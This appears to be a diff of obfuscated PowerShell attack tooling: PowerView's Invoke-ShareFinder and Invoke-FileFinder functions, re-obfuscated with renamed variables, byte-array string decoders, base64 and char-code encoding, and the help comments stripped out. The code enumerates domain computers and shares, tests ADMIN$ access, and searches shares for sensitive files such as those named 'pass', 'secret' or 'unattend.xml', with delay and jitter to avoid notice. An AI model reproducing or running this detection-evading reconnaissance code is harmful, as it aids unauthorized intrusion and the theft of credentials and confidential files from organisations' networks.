         [Double]
         $Jitter = .3,
-
         [String]
         $Domain,
-
         [String]
         $DomainController,
- 
         [Switch]
         $SearchForest,
-
         [ValidateRange(1,100)] 
         [Int]
         $Threads
     )
-
     begin {
         if ($PSBoundParameters['Debug']) {
             $DebugPreference = 'Continue'
         }
-
-        # random object for delay
-        $WLAr = New-Object System.Random
-
-        Write-Verbose ((HandleResult95 @(195,53,156,194,189,210,6,221,196,153,161,60,142,203,151,243,31,187,147,198,246,126,152,202,184,194,2,131,255,172,222,32,190,203,152,225,22,171,240,141,221,4,136,214,144,211,43,139,252,179,194,63,181,254,159,243,46,222,255,147) @(148,76,236,166,244)) + $Delay)
-
-        # figure out the shares we want to ignore
+        $BiHWqPVB = New-Object System.Random
+        Write-Verbose ((ParseEntry20 @(88,133,155,173,190,110,89,62,158,134,252,135,74,126,108,155,184,158,194,26,113,61,136,135,133,161,102,124,86,164,161,165,165,69,127,122,166,172,159,142,97,91,107,140,143,142,144,79,73,72,170,152,144,175,67,116,109,206,178,174) @(15,252,235,201,247,40,19)) + $Delay)
         [String[]] $ExcludedShares = @('')
-
         if ($ExcludePrint) {
-            $ExcludedShares = $ExcludedShares + (HandleResult95 @(55,136,186,27,54,162,161,58) @(98,206,240,81))
+            $ExcludedShares = $ExcludedShares + (ParseEntry20 @(25,54,177,29,182,53,29,27) @(76,112,251,87,226,89))
         }
         if ($ExcludeIPC) {
-            $ExcludedShares = $ExcludedShares + (HandleResult95 @(63,216,247,150,33,153,53,214) @(108,142,181,210,107,216,8,235))
+            $ExcludedShares = $ExcludedShares + (ParseEntry20 @(247,251,184,191,95,150,116,116) @(164,173,250,251,21,215,73,73))
         }
         if ($ExcludeStandard) {
-            $ExcludedShares = @('', (HandleResult95 @(224,243,193,230,154,242,133,205) @(177,166,147,168,201,167)), (HandleResult95 @(225,109,7,137,106,145,143,6) @(178,59,69,205,32,208)), ([char]0x43+[char]0x24), (HandleResult95 @(128,156,217,209,79,185,139,248) @(213,218,147,155,27)))
+            $ExcludedShares = @('', (ParseEntry20 @(220,132,74,104,132,38,185,186) @(141,209,24,38,215,115)), (ParseEntry20 @(240,146,127,156,206,242,158,249) @(163,196,61,216,132,179)), ([char]0x43+[char]0x24), (ParseEntry20 @(143,5,234,10,199,74,5,177) @(218,67,160,64,147,38,84)))
         }
-
         if(!$ComputerName) { 
-
             if($Domain) {
-                $ajPzEg = @($Domain)
+                $k8fkcV = @($Domain)
             }
             elseif($SearchForest) {
-                # get ALL the domains in the forest to search
-                $ajPzEg = Get-NetForestDomain | ForEach-Object { $_.Name }
+                $k8fkcV = Get-NetForestDomain | ForEach-Object { $_.Name }
             }
             else {
-                # use the local domain
-                $ajPzEg = @( (Get-NetDomain).name )
+                $k8fkcV = @( (Get-NetDomain).name )
             }
-
-            # if we're using a host file list, read the targets in and add them to the target list
             if($ComputerFile) {
                 $ComputerName = Get-Content -Path $ComputerFile
             }
             else {
                 [array]$ComputerName = @()
-                ForEach ($Domain in $ajPzEg) {
-                    Write-Verbose ((HandleResult95 @(191,188,104,228,85,174,131,41,218,68,162,240,121,215,41,134,140,95,210,106,138,146,94,240,126,129,132,37) @(232,197,24,128,28)) + $Domain + (HandleResult95 @(173,136,117,138,193,184,166,160,77,207,236,225,135,184,18,193) @(228,207,47,252,162,209)))
+                ForEach ($Domain in $k8fkcV) {
+                    Write-Verbose ((ParseEntry20 @(144,57,172,171,140,191,118,67,157,24,150,250,164,174,5,28,142,7,142,185,167,174,118,2,165,41,157,242) @(199,64,220,207,197,249,48,114)) + $Domain + (ParseEntry20 @(66,166,61,85,104,136,37,76,105,210,41,19,104,150,90,30) @(11,225,103,35)))
                     $ComputerName += Get-NetComputer -Domain $Domain -DomainController $DomainController -Filter $ComputerFilter -ADSpath $ComputerADSpath
                 }
             }
-
-            # remove any null target hosts, uniquify the list and shuffle it
             $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
             if($($ComputerName.count) -eq 0) {
-                throw (HandleResult95 @(187,191,125,34,192,19,214,168,33,13,236,51,181,191,124,116,195,57,190,186) @(239,210,69,69,161,84))
+                throw (ParseEntry20 @(153,101,153,226,232,79,98,183,108,233,200,238,82,54,244,57,195,232,216,96) @(205,8,161,133,137,8,91))
             }
         }
-
-        # script block that enumerates a server
-        $h6EYtum2 = {
+        $s8TS = {
             param($ComputerName, $Ping, $CheckShareAccess, $ExcludedShares, $CheckAdmin)
-
-            # optionally check if the server is up first
-            $yssh = $True
+            $lPdgSYQ = $True
             if($Ping) {
-                $yssh = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
+                $lPdgSYQ = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
             }
-            if($yssh) {
-                # get the shares for this host and check what we find
-                $ID1uhNS = Get-NetShare -ComputerName $ComputerName
-                ForEach ($AXZf4 in $ID1uhNS) {
-                    Write-Debug ((HandleResult95 @(204,211,250,57,113,60,213,198,233,51,98,22,248,195,200,39,89,61,221,211,208,9,87,29) @(155,170,138,93,56,122)) + $AXZf4)
-                    $UcLI9 = $AXZf4.shi1_netname
-                    $NvOyk = $AXZf4.shi1_remark
-                    $Path = '\\'+$ComputerName+'\'+$UcLI9
-
-                    # make sure we get a real share name back
-                    if (($UcLI9) -and ($UcLI9.trim() -ne '')) {
-                        # if we're just checking for access to ADMIN$
+            if($lPdgSYQ) {
+                $n3vQC0 = Get-NetShare -ComputerName $ComputerName
+                ForEach ($iDPwn in $n3vQC0) {
+                    Write-Debug ((ParseEntry20 @(212,61,26,146,120,96,173,239,39,4,172,93,69,138,193,62,11,177,119,95,185,215,43,13) @(131,68,106,246,49,38,227)) + $iDPwn)
+                    $Obwh = $iDPwn.shi1_netname
+                    $IN2QVrfd = $iDPwn.shi1_remark
+                    $Path = '\\'+$ComputerName+'\'+$Obwh
+                    if (($Obwh) -and ($Obwh.trim() -ne '')) {
                         if($CheckAdmin) {
-                            if($UcLI9.ToUpper() -eq (HandleResult95 @(9,115,244,210,198,13,18,205) @(88,38,166,156,149))) {
+                            if($Obwh.ToUpper() -eq (ParseEntry20 @(4,173,179,190,165,40,97,147) @(85,248,225,240,246,125))) {
                                 try {
                                     $Null = [IO.Directory]::GetFiles($Path)
-                                    (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw="))) + $ComputerName + "\" + $UcLI9 + (HandleResult95 @(144,38,89,9,193,206,228,90) @(217,103,50,125,136,143)) + $NvOyk)
+                                    (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw="))) + $ComputerName + "\" + $Obwh + (ParseEntry20 @(189,111,88,186,18,196,127,155) @(244,46,51,206,91,133,66,166)) + $IN2QVrfd)
                                 }
                                 catch {
-                                    Write-Debug ((HandleResult95 @(235,118,5,135,219,29,6,153,224,121,1,148,227,118,1,132,216,121,122,144,240,102,13,150,221,105,40,153) @(185,46,79,254)) + $Path + (HandleResult95 @(166,62,92,255) @(239,122,51,152,113)) + $_)
+                                    Write-Debug ((ParseEntry20 @(8,103,226,70,165,155,19,88,241,104,137,194,0,103,230,69,166,255,111,81,225,119,133,192,62,120,207,88) @(90,63,168,63,199,168)) + $Path + (ParseEntry20 @(178,142,55,197) @(251,202,88,162,207,126,185)) + $_)
                                 }
                             }
                         }
-                        # skip this share if it's in the exclude list
-                        elseif ($ExcludedShares -NotContains $UcLI9.ToUpper()) {
-                            # see if we want to check access to this share
+                        elseif ($ExcludedShares -NotContains $Obwh.ToUpper()) {
                             if($CheckShareAccess) {
-                                # check if the user has access to this path
                                 try {
                                     $Null = [IO.Directory]::GetFiles($Path)
-                                    (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw="))) + $ComputerName + "\" + $UcLI9 + (HandleResult95 @(249,255,223,103,118,240,52,120) @(176,190,180,19,63,177,9,69)) + $NvOyk)
+                                    (([char]0x5c+[char]0x5c) + $ComputerName + "\" + $Obwh + (ParseEntry20 @(47,56,154,174,181,157,191,91) @(102,121,241,218,252,220,130)) + $IN2QVrfd)
                                 }
                                 catch {
-                                    Write-Debug ((HandleResult95 @(215,12,177,222,40,101,204,51,162,240,4,60,223,12,181,221,43,1,176,58,178,239,8,62,225,19,156,192) @(133,84,251,167,74,86)) + $Path + (HandleResult95 @(139,252,28,36) @(194,184,115,67)) + $_)
+                                    Write-Debug ((ParseEntry20 @(104,128,75,177,47,247,130,93,129,86,134,39,158,147,116,162,96,159,120,170,130,114,154,105,172,10,163,172) @(58,216,1,200,77,196,203)) + $Path + (ParseEntry20 @(126,192,107,183) @(55,132,4,208,78,6,145)) + $_)
                                 }
                             }
                             else {
-                                (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw="))) + $ComputerName + "\" + $UcLI9 + (HandleResult95 @(162,245,69,225,89,95,65,214) @(235,180,46,149,16,30,124)) + $NvOyk)
+                                (([char]0x5c+[char]0x5c) + $ComputerName + "\" + $Obwh + (ParseEntry20 @(72,145,125,224,112,64,237,43) @(1,208,22,148,57)) + $IN2QVrfd)
                             }
                         }
                     }
                 }
             }
         }
-
     }
-
     process {
-
         if($Threads) {
-            Write-Verbose ((HandleResult95 @(4,191,146,180,204,180,49,128,184,131,198,160,8,176,154,175,207,142,103,137,149,140,202,169,54,160,187,163,202,158,58,158,134,147,232,178,49,158,157,253,231,152,111,218) @(82,231,220,196,174,217)) + $Threads)
-
-            # if we're using threading, kick off the script block with Invoke-ThreadedFunction
-            $O2kwi = @{
+            Write-Verbose ((ParseEntry20 @(150,127,16,246,180,156,163,64,58,193,190,136,154,112,24,237,183,166,245,73,23,206,178,129,164,96,57,225,178,182,168,94,4,209,144,154,163,94,31,191,159,176,253,26) @(192,39,94,134,214,241)) + $Threads)
+            $n3XrNi5 = @{
                 'Ping' = $(-not $NoPing)
                 'CheckShareAccess' = $CheckShareAccess
                 'ExcludedShares' = $ExcludedShares
                 'CheckAdmin' = $CheckAdmin
             }
-
-            # kick off the threaded script block + arguments 
-            Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $h6EYtum2 -ScriptParameters $O2kwi
+            Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $s8TS -ScriptParameters $n3XrNi5
         }
-
         else {
             if(-not $NoPing -and ($ComputerName.count -ne 1)) {
-                # ping all hosts in parallel
                 $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                 $ComputerName = Invoke-ThreadedFunction -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
             }
-
-            Write-Verbose ((HandleResult95 @(155,1,189,42,42,228,158,14,169,9,37,209,133,63,248,127,1,245,134,20,174,39,33,212,150,17,143,38,58,145,158,8,169,35,54,197,173,63,244,52,7,234,129,78,132,15,94,159) @(204,120,205,78,99,162)) + $($ComputerName.count))
-            $ypmBN = 0
-
-            ForEach ($fa0ya in $ComputerName) {
-
-                $ypmBN = $ypmBN + 1
-
-                # sleep for our semi-randomized interval
-                Start-Sleep -Seconds $WLAr.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
-
-                Write-Verbose ((HandleResult95 @(249,22,42,194,178,42,151,140,202,56,107,202,152,2,135,201,207,56,111,200,178,39,143,149,205,1,0,202,152,6,128,196) @(174,111,90,166,251,111,193,249)) + $fa0ya + ([char]0x20+[char]0x28) + $ypmBN + (HandleResult95 @(170,197,183,131,255,162,191,179) @(227,130,142,238,182)) + $($ComputerName.count) + ")")
-                Invoke-Command -ScriptBlock $h6EYtum2 -ArgumentList $fa0ya, $False, $CheckShareAccess, $ExcludedShares, $CheckAdmin
+            Write-Verbose ((ParseEntry20 @(29,4,226,22,255,75,16,190,46,58,212,1,255,74,119,249,40,42,216,30,213,100,0,190,16,20,208,26,239,62,16,184,46,16,199,21,215,74,123,178,46,53,223,68,255,76,127,245) @(74,125,146,114,182,13,66,200)) + $($ComputerName.count))
+            $o6bG = 0
+            ForEach ($mnZ6k in $ComputerName) {
+                $o6bG = $o6bG + 1
+                Start-Sleep -Seconds $BiHWqPVB.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
+                Write-Verbose ((ParseEntry20 @(31,154,41,42,153,108,47,132,44,180,104,34,179,68,63,193,41,180,108,32,153,97,55,157,43,141,3,34,179,64,56,204) @(72,227,89,78,208,41,121,241)) + $mnZ6k + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ICg="))) + $o6bG + (ParseEntry20 @(14,177,37,20,235,162,64,168) @(71,246,28,121,162,227,125,149)) + $($ComputerName.count) + ")")
+                Invoke-Command -ScriptBlock $s8TS -ArgumentList $mnZ6k, $False, $CheckShareAccess, $ExcludedShares, $CheckAdmin
             }
         }
-        
     }
 }
-
-
 function Invoke-FileFinder {
-<#
-    .SYNOPSIS
-
-        Finds sensitive files on the domain.
-
-        Author: @harmj0y
-        License: BSD 3-Clause
-
-    .DESCRIPTION
-
-        This function finds the local domain name for a host using Get-NetDomain,
-        queries the domain for all active machines with Get-NetComputer, grabs
-        the readable shares for each server, and recursively searches every
-        share for files with specific keywords in the name.
-        If a share list is passed, EVERY share is enumerated regardless of
-        other options.
-
-    .PARAMETER ComputerName
-
-        Host array to enumerate, passable on the pipeline.
-
-    .PARAMETER ComputerFile
-
-        File of hostnames/IPs to search.
-
-    .PARAMETER ComputerFilter
-
-        Host filter name to query AD for, wildcards accepted.
-
-    .PARAMETER ComputerADSpath
-
-        The LDAP source to search through for hosts, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-        Useful for OU queries.
-
-    .PARAMETER ShareList
-
-        List if \\HOST\shares to search through.
-
-    .PARAMETER Terms
-
-        Terms to search for.
-
-    .PARAMETER OfficeDocs
-
-        Switch. Search for office documents (*.doc*, *.xls*, *.ppt*)
-
-    .PARAMETER FreshEXEs
-
-        Switch. Find .EXEs accessed within the last week.
-
-    .PARAMETER LastAccessTime
-
-        Only return files with a LastAccessTime greater than this date value.
-
-    .PARAMETER LastWriteTime
-
-        Only return files with a LastWriteTime greater than this date value.
-
-    .PARAMETER CreationTime
-
-        Only return files with a CreationDate greater than this date value.
-
-    .PARAMETER IncludeC
-
-        Switch. Include any C$ shares in recursive searching (default ignore).
-
-    .PARAMETER IncludeAdmin
-
-        Switch. Include any ADMIN$ shares in recursive searching (default ignore).
-
-    .PARAMETER ExcludeFolders
-
-        Switch. Exclude folders from the search results.
-
-    .PARAMETER ExcludeHidden
-
-        Switch. Exclude hidden files and folders from the search results.
-
-    .PARAMETER CheckWriteAccess
-
-        Switch. Only returns files the current user has write access to.
-
-    .PARAMETER OutFile
-
-        Output results to a specified csv output file.
-
-    .PARAMETER NoClobber
-
-        Switch. Don't overwrite any existing output file.
-
-    .PARAMETER NoPing
-
-        Switch. Don't ping each host to ensure it's up before enumerating.
-
-    .PARAMETER Delay
-
-        Delay between enumerating hosts, defaults to 0
-
-    .PARAMETER Jitter
-
-        Jitter for the host delay, defaults to +/- 0.3
-
-    .PARAMETER Domain
-
-        Domain to query for machines, defaults to the current domain.
-
-    .PARAMETER DomainController
-
-        Domain controller to reflect LDAP queries through.
-
-    .PARAMETER SearchForest
-
-        Search all domains in the forest for target users instead of just
-        a single domain.
-
-    .PARAMETER SearchSYSVOL
-
-        Switch. Search for login scripts on the SYSVOL of the primary DCs for each specified domain.
-
-    .PARAMETER Threads
-
-        The maximum concurrent threads to execute.
-
-    .PARAMETER UsePSDrive
-
-        Switch. Mount target remote path with temporary PSDrives.
-
-    .PARAMETER Credential
-
-        Credential to use to mount the PSDrive for searching.
-
-    .EXAMPLE
-
-        PS C:\> Invoke-FileFinder
-
-        Find readable files on the domain with 'pass', 'sensitive',
-        'secret', 'admin', 'login', or 'unattend*.xml' in the name,
-
-    .EXAMPLE
-
-        PS C:\> Invoke-FileFinder -Domain testing
-
-        Find readable files on the 'testing' domain with 'pass', 'sensitive',
-        'secret', 'admin', 'login', or 'unattend*.xml' in the name,
-
-    .EXAMPLE
-
-        PS C:\> Invoke-FileFinder -IncludeC
-
-        Find readable files on the domain with 'pass', 'sensitive',
-        'secret', 'admin', 'login' or 'unattend*.xml' in the name,
-        including C$ shares.
-
-    .EXAMPLE
-
-        PS C:\> Invoke-FileFinder -ShareList shares.txt -Terms accounts,ssn -OutFile out.csv
-
-        Enumerate a specified share list for files with 'accounts' or
-        'ssn' in the name, and write everything to "out.csv"
-
-    .LINK
-        http://www.harmj0y.net/blog/redteaming/file-server-triage-on-red-team-engagements/
-
-#>
-
     [CmdletBinding()]
     param(
         [Parameter(Position=0,ValueFromPipeline=$True)]
         [Alias('Hosts')]
         [String[]]
         $ComputerName,
-
         [ValidateScript({Test-Path -Path $_ })]
         [Alias('HostList')]
         [String]
         $ComputerFile,
-
         [String]
         $ComputerFilter,
-
         [String]
         $ComputerADSpath,
-
         [ValidateScript({Test-Path -Path $_ })]
         [String]
         $ShareList,
-
         [Switch]
         $OfficeDocs,
-
         [Switch]
         $FreshEXEs,
-
         [String[]]
         $Terms,
-
         [ValidateScript({Test-Path -Path $_ })]
         [String]
         $TermList,
-
         [String]
         $LastAccessTime,
-
         [String]
         $LastWriteTime,
-
         [String]
         $CreationTime,
-
         [Switch]
         $IncludeC,
-
         [Switch]
         $IncludeAdmin,
-
         [Switch]
         $ExcludeFolders,
-
         [Switch]
         $ExcludeHidden,
-
         [Switch]
         $CheckWriteAccess,
-
         [String]
         $OutFile,
-
         [Switch]
         $NoClobber,
-
         [Switch]
         $NoPing,
-
         [UInt32]
         $Delay = 0,
-
         [Double]
         $Jitter = .3,
-
         [String]
         $Domain,
-
         [String]
         $DomainController,
-        
         [Switch]
         $SearchForest,
-
         [Switch]
         $SearchSYSVOL,
-
         [ValidateRange(1,100)] 
         [Int]
         $Threads,
-
         [Switch]
         $UsePSDrive,
-
         [System.Management.Automation.PSCredential]
         $Credential = [System.Management.Automation.PSCredential]::Empty
     )
-
     begin {
         if ($PSBoundParameters['Debug']) {
             $DebugPreference = 'Continue'
         }
-
-        # random object for delay
-        $WLAr = New-Object System.Random
-
-        Write-Verbose ((HandleResult95 @(42,211,229,13,181,74,55,155,247,4,201,124,31,199,246,14,175,91,72,152,247,91,136,96,49,255,207,25,158,75,43,237,244,62,201,103,39,242,220,14,152,62,17,154,244,42,190,103,39,253,237,1,153,95,63,220,207,0,189,49) @(125,170,149,105,252,12)) + $Delay)
-
-        $ID1uhNS = @()
-
-        # figure out the shares we want to ignore
-        [String[]] $ExcludedShares = @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QyQ="))), (HandleResult95 @(103,98,181,220,54,87,2,92) @(54,55,231,146,101,2)))
-
-        # see if we're specifically including any of the normally excluded sets
+        $BiHWqPVB = New-Object System.Random
+        Write-Verbose ((ParseEntry20 @(152,224,147,237,134,223,169,184,173,244,214,249,173,244,128,238,156,206,214,187,173,171,151,229,131,204,185,249,173,222,181,206,174,206,214,226,149,193,170,238,171,171,143,185,174,218,161,226,149,206,155,225,170,202,161,255,149,240,162,180) @(207,153,227,137)) + $Delay)
+        $n3vQC0 = @()
+        [String[]] $ExcludedShares = @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QyQ="))), (ParseEntry20 @(227,212,66,60,119,231,181,123) @(178,129,16,114,36)))
         if ($IncludeC) {
             if ($IncludeAdmin) {
                 $ExcludedShares = @()
             }
             else {
-                $ExcludedShares = @((HandleResult95 @(208,82,53,165,38,198,16,234) @(129,7,103,235,117,147,36)))
+                $ExcludedShares = @((ParseEntry20 @(4,63,111,30,115,0,94,86) @(85,106,61,80,32)))
             }
         }
-
         if ($IncludeAdmin) {
             if ($IncludeC) {
                 $ExcludedShares = @()
             }
             else {
-                $ExcludedShares = @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QyQ="))))
+                $ExcludedShares = @(([char]0x43+[char]0x24))
             }
         }
-
-        # delete any existing output file if it already exists
         if(!$NoClobber) {
             if ($OutFile -and (Test-Path -Path $OutFile)) { Remove-Item -Path $OutFile }
         }
-
-        # if there's a set of terms specified to search for
         if ($TermList) {
-            ForEach ($wrWn in Get-Content -Path $TermList) {
-                if (($wrWn -ne $Null) -and ($wrWn.trim() -ne '')) {
-                    $Terms += $wrWn
+            ForEach ($rPRBHTCp in Get-Content -Path $TermList) {
+                if (($rPRBHTCp -ne $Null) -and ($rPRBHTCp.trim() -ne '')) {
+                    $Terms += $rPRBHTCp
                 }
             }
         }
-
         if($Domain) {
-            $ajPzEg = @($Domain)
+            $k8fkcV = @($Domain)
         }
         elseif($SearchForest) {
-            # get ALL the domains in the forest to search
-            $ajPzEg = Get-NetForestDomain | ForEach-Object { $_.Name }
+            $k8fkcV = Get-NetForestDomain | ForEach-Object { $_.Name }
         }
         else {
-            # use the local domain
-            $ajPzEg = @( (Get-NetDomain).name )
+            $k8fkcV = @( (Get-NetDomain).name )
         }
-
-        # if we're hard-passed a set of shares
         if($ShareList) {
-            ForEach ($yaamBtA in Get-Content -Path $ShareList) {
-                if (($yaamBtA -ne $Null) -and ($yaamBtA.trim() -ne '')) {
-                    # exclude any "[tab]- commants", i.e. the output from Invoke-ShareFinder
-                    $AXZf4 = $yaamBtA.Split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("CQ=="))))[0]
-                    $ID1uhNS += $AXZf4
+            ForEach ($ZctXocR in Get-Content -Path $ShareList) {
+                if (($ZctXocR -ne $Null) -and ($ZctXocR.trim() -ne '')) {
+                    $iDPwn = $ZctXocR.Split(([char]0x09))[0]
+                    $n3vQC0 += $iDPwn
                 }
             }
         }
         if($SearchSYSVOL) {
-            ForEach ($Domain in $ajPzEg) {
-                $PxcQ9wVg = (([char]0x5c+[char]0x5c) + $Domain + (HandleResult95 @(241,100,112,147,47,152,120,110,157,60,222,31) @(169,34,62,201,122)))
-                Write-Verbose ((HandleResult95 @(140,142,9,21,146,178,63,26,129,176,21,4,129,142,59,11,186,176,63,8,129,164,59,11,129,160,63,8,130,197,30,22,184,176,63,65,186,180,56,76) @(219,247,121,113)) + $PxcQ9wVg)
-                $ID1uhNS += $PxcQ9wVg
+            ForEach ($Domain in $k8fkcV) {
+                $VAAjq = (([char]0x5c+[char]0x5c) + $Domain + (ParseEntry20 @(64,97,76,87,77,22,88,93,76,97,117,48) @(24,39,2,13)))
+                Write-Verbose ((ParseEntry20 @(186,107,222,112,111,182,171,121,244,83,74,134,183,107,236,110,71,180,171,107,244,71,100,137,183,69,232,109,127,193,138,117,205,83,96,195,140,81,239,41) @(237,18,174,20,38,243)) + $VAAjq)
+                $n3vQC0 += $VAAjq
             }
             if(!$Terms) {
-                # search for interesting scripts on SYSVOL
                 $Terms = @('.vbs', '.bat', '.ps1')
             }
         }
         else {
-            # if we're using a host list, read the targets in and add them to the target list
             if($ComputerFile) {
                 $ComputerName = Get-Content -Path $ComputerFile
             }
             else {
                 [array]$ComputerName = @()
-                ForEach ($Domain in $ajPzEg) {
-                    Write-Verbose ((HandleResult95 @(253,224,40,160,227,223,30,245,240,193,18,241,203,206,109,170,227,222,10,178,200,206,30,180,200,240,25,249) @(170,153,88,196)) + $Domain + (HandleResult95 @(230,9,158,124,95,198,12,171,104,15,225,126,167,125,1,146) @(175,78,196,10,60)))
+                ForEach ($Domain in $k8fkcV) {
+                    Write-Verbose ((ParseEntry20 @(165,5,92,196,149,40,101,173,168,36,102,149,189,57,22,242,187,59,126,214,190,57,101,236,144,21,109,157) @(242,124,44,160,220,110,35,156)) + $Domain + (ParseEntry20 @(14,42,223,247,189,191,5,2,231,178,144,230,36,26,184,188) @(71,109,133,129,222,214)))
                     $ComputerName += Get-NetComputer -Filter $ComputerFilter -ADSpath $ComputerADSpath -Domain $Domain -DomainController $DomainController
                 }
             }
-
-            # remove any null target hosts, uniquify the list and shuffle it
             $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
             if($($ComputerName.Count) -eq 0) {
-                throw (HandleResult95 @(17,224,35,54,27,0,124,247,127,25,55,32,31,224,34,96,24,42,20,229) @(69,141,27,81,122,71))
+                throw (ParseEntry20 @(182,42,131,54,222,165,126,193,53,247,175,32,225,60,134,211,37,214,0,215) @(226,71,187,81,191))
             }
         }
-
-        # script block that enumerates shares and files on a server
-        $h6EYtum2 = {
+        $s8TS = {
             param($ComputerName, $Ping, $ExcludedShares, $Terms, $ExcludeFolders, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $OutFile, $UsePSDrive, $Credential)
-
-            Write-Verbose ((HandleResult95 @(182,55,23,13,132,77,120,73,189,93,100,54,190,82,31,21,168,108,111,68) @(231,5,46,121)) + $ComputerName)
-            Write-Verbose ((HandleResult95 @(211,215,65,146,41,186,215,228,115,175,25,166,224,200,111,129,17,170,204,185,96,185,118,207) @(129,143,41,248,75,242)) + $ExcludedShares)
-            $xgY1OJgz = @()
-
-            if($ComputerName.StartsWith(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw="))))) {
-                # if a share is passed as the server
-                $xgY1OJgz += $ComputerName
+            Write-Verbose ((ParseEntry20 @(64,200,3,82,228,80,98,170,75,162,112,105,222,79,5,246,94,147,123,27) @(17,250,58,38,135,24,52,154)) + $ComputerName)
+            Write-Verbose ((ParseEntry20 @(192,133,142,127,172,136,132,227,200,138,180,65,175,135,148,241,200,133,171,35,135,129,239,181) @(146,221,230,21,206,192,210,136)) + $ExcludedShares)
+            $FNxC8y5 = @()
+            if($ComputerName.StartsWith(([char]0x5c+[char]0x5c))) {
+                $FNxC8y5 += $ComputerName
             }
             else {
-                # if we're enumerating the shares on the target server first
-                $yssh = $True
+                $lPdgSYQ = $True
                 if($Ping) {
-                    $yssh = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
+                    $lPdgSYQ = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
                 }
-                if($yssh) {
-                    # get the shares for this host and display what we find
-                    $ID1uhNS = Get-NetShare -ComputerName $ComputerName
-                    ForEach ($AXZf4 in $ID1uhNS) {
-
-                        $UcLI9 = $AXZf4.shi1_netname
-                        $Path = '\\'+$ComputerName+'\'+$UcLI9
-
-                        # make sure we get a real share name back
-                        if (($UcLI9) -and ($UcLI9.trim() -ne '')) {
-
-                            # skip this share if it's in the exclude list
-                            if ($ExcludedShares -NotContains $UcLI9.ToUpper()) {
-                                # check if the user has access to this path
+                if($lPdgSYQ) {
+                    $n3vQC0 = Get-NetShare -ComputerName $ComputerName
+                    ForEach ($iDPwn in $n3vQC0) {
+                        $Obwh = $iDPwn.shi1_netname
+                        $Path = '\\'+$ComputerName+'\'+$Obwh
+                        if (($Obwh) -and ($Obwh.trim() -ne '')) {
+                            if ($ExcludedShares -NotContains $Obwh.ToUpper()) {
                                 try {
                                     $Null = [IO.Directory]::GetFiles($Path)
-                                    $xgY1OJgz += $Path
+                                    $FNxC8y5 += $Path
                                 }
                                 catch {
-                                    Write-Debug ((HandleResult95 @(35,193,49,22,43,85,223,2,241,48,52,8,73,216,34,194,20,11,32,32,136,13,249,74) @(116,184,119,114,98,16,234)) + $Path)
+                                    Write-Debug ((ParseEntry20 @(183,48,150,247,112,165,124,166,218,126,166,35,137,161,111,154,42,169,209,9,130,48,145,174) @(224,73,208,147,57)) + $Path)
                                 }
                             }
                         }
                     }
                 }
             }
-
-            ForEach($AXZf4 in $xgY1OJgz) {
-                $fclLo =  @{
-                    'Path' = $AXZf4
+            ForEach($iDPwn in $FNxC8y5) {
+                $BJnRkp =  @{
+                    'Path' = $iDPwn
                     'Terms' = $Terms
                     'OfficeDocs' = $OfficeDocs
                     'FreshEXEs' = $FreshEXEs
@@ -9787,19 +4868,14 @@ function Invoke-FileFinder {
                     'UsePSDrive' = $UsePSDrive
                     'Credential' = $Credential
                 }
-
-                Find-InterestingFile @fclLo
+                Find-InterestingFile @BJnRkp
             }
         }
     }
-
     process {
-
         if($Threads) {
-            Write-Verbose ((HandleResult95 @(40,128,219,175,119,174,63,69,26,159,253,166,79,148,26,73,31,143,160,177,92,139,56,82,26,159,242,184,113,132,52,91,36,143,211,180,118,186,29,27,55,153,168,226) @(126,216,149,223,21,195,92,34)) + $Threads)
-
-            # if we're using threading, kick off the script block with Invoke-ThreadedFunction
-            $O2kwi = @{
+            Write-Verbose ((ParseEntry20 @(166,177,67,69,198,193,126,151,141,74,93,221,246,74,182,130,108,98,145,194,84,184,141,125,81,227,203,122,148,174,101,76,254,251,91,155,138,116,116,157,229,92,205,212) @(240,233,13,53,164,172,29)) + $Threads)
+            $n3XrNi5 = @{
                 'Ping' = $(-not $NoPing)
                 'ExcludedShares' = $ExcludedShares
                 'Terms' = $Terms
@@ -9812,1325 +4888,635 @@ function Invoke-FileFinder {
                 'UsePSDrive' = $UsePSDrive
                 'Credential' = $Credential
             }
-
-            # kick off the threaded script block + arguments 
-            if($ID1uhNS) {
-                # pass the shares as the hosts so the threaded function code doesn't have to be hacked up
-                Invoke-ThreadedFunction -ComputerName $ID1uhNS -ScriptBlock $h6EYtum2 -ScriptParameters $O2kwi
+            if($n3vQC0) {
+                Invoke-ThreadedFunction -ComputerName $n3vQC0 -ScriptBlock $s8TS -ScriptParameters $n3XrNi5
             }
             else {
-                Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $h6EYtum2 -ScriptParameters $O2kwi
+                Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $s8TS -ScriptParameters $n3XrNi5
             }        
         }
-
         else {
-            if($ID1uhNS){
-                $ComputerName = $ID1uhNS
+            if($n3vQC0){
+                $ComputerName = $n3vQC0
             }
             elseif(-not $NoPing -and ($ComputerName.count -gt 1)) {
-                # ping all hosts in parallel
